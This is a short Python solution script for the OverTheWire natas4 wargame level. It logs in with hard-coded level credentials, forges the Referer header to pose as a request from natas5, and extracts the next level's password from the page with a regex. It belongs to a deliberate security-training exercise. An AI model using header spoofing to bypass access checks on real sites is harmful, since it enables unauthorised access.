#Import Library
import requests
import re

#Setting variables needed
username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = f'http://{username}.natas.labs.overthewire.org/'
headers = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}

#Connect to natas
session = requests.Session()
response = session.request('GET', url, auth=(username,password), headers=headers)

#Filtering to get a password
#result = response.text
result = re.findall('Access granted. The password for natas5 is (.*)', response.text)[0]

print(result)
